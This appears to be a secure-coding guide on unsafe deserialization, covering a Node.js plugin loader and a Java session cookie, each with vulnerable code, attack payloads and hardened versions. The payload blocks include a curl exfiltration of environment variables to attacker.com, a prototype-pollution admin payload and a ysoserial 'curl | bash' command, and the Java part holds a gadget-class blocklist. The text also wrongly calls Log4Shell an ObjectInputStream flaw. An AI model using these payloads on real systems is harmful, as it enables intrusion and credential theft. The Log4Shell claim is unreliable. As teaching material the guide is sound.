JSON.parse itself is generally safe for data deserialization, but the real danger comes from trusting and using deserialized data without integrity verification, especially when that data comes from external sources or contains executable configurations.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const axios = require('axios');
const vm = require('vm');

const app = express();
app.use(express.json());

// Vulnerable: Fetches and executes configuration without integrity checks
app.post('/api/load-plugin', async (req, res) => {
  const { pluginUrl } = req.body;

  try {
    // Fetches remote configuration without verifying source
    const response = await axios.get(pluginUrl);
    const pluginConfig = response.data;

    // Dangerous: Executes code from untrusted source
    if (pluginConfig.initScript) {
      const script = new vm.Script(pluginConfig.initScript);
      script.runInThisContext();
    }

    // Stores configuration without validation
    global.plugins = global.plugins || {};
    global.plugins[pluginConfig.name] = pluginConfig;

    res.json({ success: true, loaded: pluginConfig.name });
  } catch (error) {
    res.status(500).json({ error: 'Failed to load plugin' });
  }
});

// Vulnerable: Deserializes user preferences without schema validation
app.post('/api/import-settings', (req, res) => {
  const { settingsData } = req.body;

  // Directly uses deserialized data without checks
  const settings = JSON.parse(Buffer.from(settingsData, 'base64').toString());

  // Prototype pollution possible if settings contains __proto__
  Object.assign(req.session.user, settings);

  res.json({ success: true });
});

app.listen(3000);
```

**Attack Payload**:
```json
{
  "pluginUrl": "https://attacker.com/malicious-plugin.json"
}
```

Malicious plugin response:
```json
{
  "name": "analytics",
  "version": "1.0.0",
  "initScript": "require('child_process').exec('curl https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(process.env)))"
}
```

Prototype pollution payload:
```json
{
  "settingsData": "eyJfX3Byb3RvX18iOnsiaXNBZG1pbiI6dHJ1ZX19"
}
```

**Why This Is Dangerous**:
- No verification that remote data comes from a trusted source
- Arbitrary code execution through vm.Script with untrusted input
- Prototype pollution via Object.assign with attacker-controlled data
- No schema validation allowing arbitrary properties to be injected
- Missing Content-Type and checksum verification for remote resources

**SECURE VERSION**:

```javascript
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const Ajv = require('ajv');

const app = express();
app.use(express.json());

const ajv = new Ajv({ allErrors: true });

// Trusted plugin registry with integrity hashes
const TRUSTED_PLUGINS = {
  'https://trusted-cdn.example.com/plugins/analytics.json': {
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    allowedDomain: 'trusted-cdn.example.com'
  }
};

// Schema for plugin configuration (no executable code allowed)
const pluginSchema = {
  type: 'object',
  properties: {
    name: { type: 'string', pattern: '^[a-z0-9-]+$', maxLength: 50 },
    version: { type: 'string', pattern: '^\\d+\\.\\d+\\.\\d+$' },
    settings: { type: 'object', additionalProperties: { type: 'string' } }
  },
  required: ['name', 'version'],
  additionalProperties: false
};

const validatePlugin = ajv.compile(pluginSchema);

// Secure: Verify integrity before loading
async function loadPluginSecurely(pluginUrl) {
  const trustedPlugin = TRUSTED_PLUGINS[pluginUrl];
  if (!trustedPlugin) {
    throw new Error('Plugin not in trusted registry');
  }

  const url = new URL(pluginUrl);
  if (url.hostname !== trustedPlugin.allowedDomain) {
    throw new Error('Plugin domain mismatch');
  }

  const response = await axios.get(pluginUrl, {
    timeout: 5000,
    maxContentLength: 1024 * 100 // 100KB max
  });

  const content = JSON.stringify(response.data);
  const hash = crypto.createHash('sha256').update(content).digest('hex');

  if (hash !== trustedPlugin.sha256) {
    throw new Error(`Integrity check failed. Expected: ${trustedPlugin.sha256}, Got: ${hash}`);
  }

  if (!validatePlugin(response.data)) {
    throw new Error(`Schema validation failed: ${JSON.stringify(validatePlugin.errors)}`);
  }

  return response.data;
}

app.post('/api/load-plugin', async (req, res) => {
  const { pluginUrl } = req.body;

  try {
    const pluginConfig = await loadPluginSecurely(pluginUrl);

    // Safe storage with no prototype chain access
    const plugins = Object.create(null);
    plugins[pluginConfig.name] = Object.freeze({ ...pluginConfig });

    console.log(`Plugin loaded: ${pluginConfig.name} v${pluginConfig.version}`);
    res.json({ success: true, loaded: pluginConfig.name });
  } catch (error) {
    console.error(`Plugin load failed: ${error.message}`);
    res.status(400).json({ error: 'Failed to load plugin' });
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **Allowlist validation**: Only plugins in TRUSTED_PLUGINS registry can be loaded
- **Cryptographic integrity**: SHA-256 hash verification ensures content hasn't been tampered with
- **Schema validation**: Ajv ensures data conforms to expected structure with no arbitrary properties
- **No code execution**: Removed vm.Script entirely; plugins are data-only configurations
- **Prototype pollution prevention**: Object.create(null) creates objects with no prototype chain

For production systems with dynamic plugin loading, you need cryptographic signatures, certificate pinning, and multiple verification layers. Here's how major package managers and CDNs handle integrity at scale.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const Ajv = require('ajv');
const NodeCache = require('node-cache');
const winston = require('winston');

const app = express();
app.use(express.json());

// Structured logging for security events
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  defaultMeta: { service: 'plugin-loader' },
  transports: [
    new winston.transports.File({ filename: 'security-audit.log' })
  ]
});

// Cache for verified plugins to avoid repeated validation
const verifiedPluginCache = new NodeCache({ stdTTL: 3600, checkperiod: 600 });

// Public keys for trusted publishers (loaded from secure config)
const TRUSTED_PUBLISHERS = {
  'official': `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----`,
  'verified-partner': `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----`
};

const ALLOWED_CDN_DOMAINS = [
  'plugins.example.com',
  'cdn.trusted-partner.com'
];

class PluginIntegrityService {
  constructor() {
    this.ajv = new Ajv({ allErrors: true, strict: true });
    this.manifestSchema = this.ajv.compile({
      type: 'object',
      properties: {
        name: { type: 'string', pattern: '^[a-z][a-z0-9-]{2,49}$' },
        version: { type: 'string', pattern: '^\\d+\\.\\d+\\.\\d+(-[a-z0-9.]+)?$' },
        publisher: { type: 'string', enum: Object.keys(TRUSTED_PUBLISHERS) },
        sha384: { type: 'string', pattern: '^[a-f0-9]{96}$' },
        signature: { type: 'string' },
        permissions: {
          type: 'array',
          items: { type: 'string', enum: ['network', 'storage', 'ui'] },
          maxItems: 10
        },
        config: { type: 'object', additionalProperties: false }
      },
      required: ['name', 'version', 'publisher', 'sha384', 'signature'],
      additionalProperties: false
    });
  }

  validateDomain(url) {
    const parsedUrl = new URL(url);

    if (parsedUrl.protocol !== 'https:') {
      throw new IntegrityError('HTTPS required for plugin sources');
    }

    if (!ALLOWED_CDN_DOMAINS.includes(parsedUrl.hostname)) {
      throw new IntegrityError(`Untrusted domain: ${parsedUrl.hostname}`);
    }

    return parsedUrl;
  }

  verifySignature(manifest, contentHash) {
    const publicKey = TRUSTED_PUBLISHERS[manifest.publisher];
    if (!publicKey) {
      throw new IntegrityError(`Unknown publisher: ${manifest.publisher}`);
    }

    // Canonical data for signature verification
    const signedData = JSON.stringify({
      name: manifest.name,
      version: manifest.version,
      publisher: manifest.publisher,
      sha384: manifest.sha384
    });

    const verifier = crypto.createVerify('RSA-SHA256');
    verifier.update(signedData);

    const signatureBuffer = Buffer.from(manifest.signature, 'base64');
    const isValid = verifier.verify(publicKey, signatureBuffer);

    if (!isValid) {
      throw new IntegrityError('Invalid publisher signature');
    }

    // Verify content hash matches manifest
    if (contentHash !== manifest.sha384) {
      throw new IntegrityError(
        `Content hash mismatch. Expected: ${manifest.sha384}, Got: ${contentHash}`
      );
    }

    return true;
  }

  computeHash(content) {
    return crypto.createHash('sha384').update(content).digest('hex');
  }

  async fetchWithIntegrity(url, expectedHash = null) {
    const parsedUrl = this.validateDomain(url);

    const response = await axios.get(parsedUrl.href, {
      timeout: 10000,
      maxContentLength: 5 * 1024 * 1024, // 5MB max
      responseType: 'arraybuffer',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'PluginLoader/1.0'
      },
      httpsAgent: new (require('https').Agent)({
        rejectUnauthorized: true,
        minVersion: 'TLSv1.2'
      })
    });

    const content = Buffer.from(response.data);
    const hash = this.computeHash(content);

    if (expectedHash && hash !== expectedHash) {
      throw new IntegrityError(
        `Integrity check failed for ${url}`
      );
    }

    return { content, hash };
  }

  safeJsonParse(buffer) {
    const text = buffer.toString('utf8');

    // Check for prototype pollution attempts in raw text
    if (/__proto__|constructor|prototype/i.test(text)) {
      throw new IntegrityError('Suspicious content detected');
    }

    const parsed = JSON.parse(text);

    // Create clean object without prototype chain
    return JSON.parse(JSON.stringify(parsed), (key, value) => {
      if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        return undefined;
      }
      return value;
    });
  }

  async loadPlugin(manifestUrl) {
    const cacheKey = `plugin:${manifestUrl}`;
    const cached = verifiedPluginCache.get(cacheKey);
    if (cached) {
      logger.info('Plugin loaded from cache', { manifestUrl });
      return cached;
    }

    logger.info('Loading plugin', { manifestUrl });

    // Step 1: Fetch and parse manifest
    const { content: manifestContent, hash: manifestHash } = 
      await this.fetchWithIntegrity(manifestUrl);

    const manifest = this.safeJsonParse(manifestContent);

    // Step 2: Validate manifest schema
    if (!this.manifestSchema(manifest)) {
      logger.warn('Manifest schema validation failed', {
        manifestUrl,
        errors: this.manifestSchema.errors
      });
      throw new IntegrityError('Invalid manifest schema');
    }

    // Step 3: Fetch plugin content
    const pluginUrl = manifestUrl.replace('/manifest.json', '/plugin.json');
    const { content: pluginContent, hash: pluginHash } = 
      await this.fetchWithIntegrity(pluginUrl, manifest.sha384);

    // Step 4: Verify publisher signature
    this.verifySignature(manifest, pluginHash);

    // Step 5: Parse and freeze plugin data
    const pluginData = this.safeJsonParse(pluginContent);
    const frozenPlugin = Object.freeze({
      manifest: Object.freeze({ ...manifest }),
      data: Object.freeze(pluginData),
      loadedAt: new Date().toISOString(),
      verificationChain: {
        manifestHash,
        contentHash: pluginHash,
        publisher: manifest.publisher,
        verified: true
      }
    });

    // Step 6: Cache verified plugin
    verifiedPluginCache.set(cacheKey, frozenPlugin);

    logger.info('Plugin verified and loaded', {
      name: manifest.name,
      version: manifest.version,
      publisher: manifest.publisher,
      contentHash: pluginHash
    });

    return frozenPlugin;
  }
}

class IntegrityError extends Error {
  constructor(message) {
    super(message);
    this.name = 'IntegrityError';
    this.statusCode = 400;
  }
}

const integrityService = new PluginIntegrityService();

// Rate limiting for plugin loading
const rateLimit = require('express-rate-limit');
const pluginLoadLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: 'Too many plugin load requests' }
});

app.post('/api/plugins/load', pluginLoadLimiter, async (req, res) => {
  const { manifestUrl } = req.body;
  const requestId = crypto.randomUUID();

  try {
    if (!manifestUrl || typeof manifestUrl !== 'string') {
      throw new IntegrityError('manifestUrl is required');
    }

    const plugin = await integrityService.loadPlugin(manifestUrl);

    logger.info('Plugin load success', {
      requestId,
      pluginName: plugin.manifest.name,
      version: plugin.manifest.version,
      clientIp: req.ip
    });

    res.json({
      success: true,
      plugin: {
        name: plugin.manifest.name,
        version: plugin.manifest.version,
        permissions: plugin.manifest.permissions || [],
        verified: true
      }
    });
  } catch (error) {
    logger.error('Plugin load failed', {
      requestId,
      manifestUrl,
      error: error.message,
      clientIp: req.ip
    });

    const statusCode = error instanceof IntegrityError ? 400 : 500;
    res.status(statusCode).json({
      error: error instanceof IntegrityError ? 
        error.message : 'Internal server error'
    });
  }
});

// Health check endpoint for monitoring
app.get('/api/plugins/health', (req, res) => {
  const stats = verifiedPluginCache.getStats();
  res.json({
    status: 'healthy',
    cache: {
      hits: stats.hits,
      misses: stats.misses,
      keys: stats.keys
    }
  });
});

app.listen(3000);
```

**Defense in Depth Layers**:

1. **Domain allowlisting with TLS verification**:
```javascript
// Only HTTPS from trusted domains with TLS 1.2+
const httpsAgent = new https.Agent({
  rejectUnauthorized: true,
  minVersion: 'TLSv1.2'
});
```

2. **Cryptographic signature verification**:
```javascript
// RSA-SHA256 signatures from known publishers
const verifier = crypto.createVerify('RSA-SHA256');
verifier.update(canonicalData);
const isValid = verifier.verify(publicKey, signature);
```

3. **Content hash validation (SRI pattern)**:
```javascript
// SHA-384 hash matches manifest declaration
const hash = crypto.createHash('sha384').update(content).digest('hex');
if (hash !== manifest.sha384) {
  throw new IntegrityError('Content tampered');
}
```

**Additional Protections**:
- **Prototype pollution prevention**: Sanitize JSON keys and use Object.create(null)
- **Schema validation**: Strict Ajv validation with additionalProperties: false
- **Rate limiting**: Prevent abuse of plugin loading endpoint
- **Audit logging**: All load attempts logged with request details for incident response
- **Cache with TTL**: Reduce attack surface by caching verified plugins
- **Immutable data**: Object.freeze prevents runtime modification of loaded plugins
- **Content size limits**: Prevent denial of service via oversized payloads

Using `ObjectInputStream` directly on untrusted data is **extremely dangerous** and has led to some of the most severe vulnerabilities in Java history, including Log4Shell (CVE-2021-44228) which affected 93% of enterprise cloud environments.

**VULNERABLE CODE**:

```java
import java.io.*;
import java.util.Base64;
import javax.servlet.http.*;

public class SessionController extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("session".equals(cookie.getName())) {
                    // VULNERABLE: Deserializing untrusted data directly
                    byte[] data = Base64.getDecoder().decode(cookie.getValue());
                    ByteArrayInputStream bis = new ByteArrayInputStream(data);
                    ObjectInputStream ois = new ObjectInputStream(bis);

                    try {
                        // This can execute arbitrary code!
                        UserSession session = (UserSession) ois.readObject();
                        response.getWriter().write("Welcome, " + session.getUsername());
                    } catch (ClassNotFoundException e) {
                        response.sendError(500, "Session error");
                    } finally {
                        ois.close();
                    }
                }
            }
        }
    }
}
```

**Attack Payload**:
```bash
# Using ysoserial to generate malicious payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# The resulting Base64 string is placed in the session cookie
# When deserialized, it executes the command on the server
```

**Why This Is Dangerous**:
- Java deserialization reconstructs objects and can trigger methods during the process (`readObject`, `readResolve`, finalizers)
- Gadget chains in common libraries (Commons Collections, Spring, etc.) allow arbitrary code execution
- The type cast happens AFTER deserialization - malicious code already executed
- No way to validate object safety before deserialization completes

**SECURE VERSION**:

```java
import java.io.*;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.servlet.http.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.util.Base64;

public class SecureSessionController extends HttpServlet {

    private static final String SECRET_KEY = System.getenv("SESSION_SECRET_KEY");
    private static final String HMAC_ALGO = "HmacSHA256";
    private final ObjectMapper objectMapper = new ObjectMapper();

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("session".equals(cookie.getName())) {
                    try {
                        // SECURE: Use JSON instead of Java serialization
                        String cookieValue = cookie.getValue();
                        String[] parts = cookieValue.split("\\.");

                        if (parts.length != 2) {
                            response.sendError(400, "Invalid session format");
                            return;
                        }

                        String payload = parts[0];
                        String signature = parts[1];

                        // SECURE: Verify HMAC signature before parsing
                        if (!verifySignature(payload, signature)) {
                            response.sendError(403, "Invalid session signature");
                            return;
                        }

                        // SECURE: Parse JSON to specific class (no arbitrary deserialization)
                        String json = new String(Base64.getDecoder().decode(payload));
                        UserSession session = objectMapper.readValue(json, UserSession.class);

                        // Validate session data
                        if (session.isExpired()) {
                            response.sendError(401, "Session expired");
                            return;
                        }

                        response.getWriter().write("Welcome, " + 
                            sanitize(session.getUsername()));

                    } catch (Exception e) {
                        response.sendError(500, "Session error");
                    }
                }
            }
        }
    }

    private boolean verifySignature(String payload, String signature) {
        try {
            Mac mac = Mac.getInstance(HMAC_ALGO);
            mac.init(new SecretKeySpec(SECRET_KEY.getBytes(), HMAC_ALGO));
            String computed = Base64.getUrlEncoder().encodeToString(mac.doFinal(payload.getBytes()));
            return MessageDigest.isEqual(computed.getBytes(), signature.getBytes());
        } catch (Exception e) {
            return false;
        }
    }

    private String sanitize(String input) {
        return input.replaceAll("[<>\"'&]", "");
    }
}
```

**Key Security Controls**:
- **JSON instead of Java serialization**: JSON parsers don't execute code during parsing, eliminating gadget chain attacks
- **HMAC signature verification**: Ensures data integrity and authenticity before any parsing occurs
- **Type-safe deserialization**: Jackson maps to a specific class with defined fields, rejecting unknown properties
- **Constant-time comparison**: `MessageDigest.isEqual()` prevents timing attacks on signature verification

If you must use Java serialization for legacy compatibility, you need multiple defensive layers. However, understand that this is inherently risky and should be migrated away from as soon as possible.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.logging.Logger;
import javax.servlet.http.*;

public class DefensiveDeserializationService {

    private static final Logger LOGGER = Logger.getLogger(
        DefensiveDeserializationService.class.getName());

    // LAYER 1: Strict allowlist of permitted classes
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.company.session.UserSession",
        "com.company.session.SessionMetadata",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.Date",
        "java.util.ArrayList",
        "java.util.HashMap"
    );

    // LAYER 2: Explicit blocklist of dangerous classes
    private static final Set<String> BLOCKED_CLASSES = Set.of(
        "org.apache.commons.collections",
        "org.apache.commons.beanutils",
        "org.springframework.beans.factory",
        "com.sun.org.apache.xalan",
        "javax.management",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "java.net.URLClassLoader"
    );

    private static final int MAX_DEPTH = 5;
    private static final int MAX_OBJECTS = 100;
    private static final int MAX_BYTES = 10240; // 10KB max

    public <T> T safeDeserialize(byte[] data, Class<T> expectedType, 
                                   String sourceIP) throws SecurityException {

        // LAYER 3: Size validation
        if (data == null || data.length == 0) {
            throw new SecurityException("Empty data received");
        }
        if (data.length > MAX_BYTES) {
            LOGGER.warning(String.format(
                "Oversized deserialization attempt from %s: %d bytes", 
                sourceIP, data.length));
            throw new SecurityException("Data exceeds maximum allowed size");
        }

        // LAYER 4: Use a filtering ObjectInputStream
        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
             ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bis, sourceIP)) {

            Object obj = ois.readObject();

            // LAYER 5: Verify expected type after deserialization
            if (!expectedType.isInstance(obj)) {
                LOGGER.severe(String.format(
                    "Type mismatch during deserialization from %s: expected %s, got %s",
                    sourceIP, expectedType.getName(), obj.getClass().getName()));
                throw new SecurityException("Unexpected object type");
            }

            LOGGER.info(String.format(
                "Successful deserialization of %s from %s", 
                expectedType.getName(), sourceIP));

            return expectedType.cast(obj);

        } catch (ClassNotFoundException e) {
            LOGGER.severe("Unknown class during deserialization from " + sourceIP);
            throw new SecurityException("Unknown class in serialized data");
        } catch (IOException e) {
            LOGGER.severe("IO error during deserialization from " + sourceIP);
            throw new SecurityException("Invalid serialized data format");
        }
    }

    // Custom ObjectInputStream with class filtering
    private class ValidatingObjectInputStream extends ObjectInputStream {
        private final String sourceIP;
        private int objectCount = 0;
        private int depth = 0;

        public ValidatingObjectInputStream(InputStream in, String sourceIP) 
                throws IOException {
            super(in);
            this.sourceIP = sourceIP;
            // Enable filtering (Java 9+)
            this.setObjectInputFilter(this::checkInput);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) 
                throws IOException, ClassNotFoundException {

            String className = desc.getName();

            // DEFENSE 1: Check blocklist first
            for (String blocked : BLOCKED_CLASSES) {
                if (className.startsWith(blocked)) {
                    LOGGER.severe(String.format(
                        "BLOCKED: Attempted deserialization of dangerous class %s from %s",
                        className, sourceIP));
                    throw new SecurityException(
                        "Attempted deserialization of blocked class: " + className);
                }
            }

            // DEFENSE 2: Only allow explicitly permitted classes
            if (!ALLOWED_CLASSES.contains(className) && 
                !className.startsWith("[")) { // Allow arrays

                LOGGER.warning(String.format(
                    "REJECTED: Unauthorized class %s from %s", className, sourceIP));
                throw new SecurityException(
                    "Class not in allowlist: " + className);
            }

            return super.resolveClass(desc);
        }

        // Java 9+ ObjectInputFilter for additional limits
        private ObjectInputFilter.Status checkInput(ObjectInputFilter.FilterInfo info) {

            // Limit object graph depth
            if (info.depth() > MAX_DEPTH) {
                LOGGER.warning("Max depth exceeded from " + sourceIP);
                return ObjectInputFilter.Status.REJECTED;
            }

            // Limit total objects
            if (info.references() > MAX_OBJECTS) {
                LOGGER.warning("Max objects exceeded from " + sourceIP);
                return ObjectInputFilter.Status.REJECTED;
            }

            Class<?> clazz = info.serialClass();
            if (clazz != null) {
                String className = clazz.getName();

                // Additional runtime class checking
                for (String blocked : BLOCKED_CLASSES) {
                    if (className.startsWith(blocked)) {
                        LOGGER.severe("Filter blocked class: " + className);
                        return ObjectInputFilter.Status.REJECTED;
                    }
                }
            }

            return ObjectInputFilter.Status.UNDECIDED;
        }
    }
}
```

**Defense in Depth Layers**:

1. **Strict Class Allowlisting**:
```java
// Only these specific classes can be deserialized
private static final Set<String> ALLOWED_CLASSES = Set.of(
    "com.company.session.UserSession",
    "java.lang.String",
    "java.util.Date"
);
```

2. **Gadget Chain Blocklist**:
```java
// Block known dangerous packages even if allowlist is bypassed
private static final Set<String> BLOCKED_CLASSES = Set.of(
    "org.apache.commons.collections",  // ysoserial gadgets
    "java.lang.ProcessBuilder"         // Command execution
);
```

3. **Java 9+ ObjectInputFilter**:
```java
// Set JVM-wide filter for all deserialization
ObjectInputFilter.Config.setSerialFilter(
    ObjectInputFilter.Config.createFilter(
        "maxdepth=5;maxrefs=100;maxbytes=10240;" +
        "!org.apache.commons.collections.**;" +
        "!org.springframework.beans.factory.**"
    )
);
```

**Additional Protections**:

- **Remove gadget libraries from classpath**: Audit dependencies and remove or upgrade vulnerable versions of Commons Collections, Spring Framework, etc.
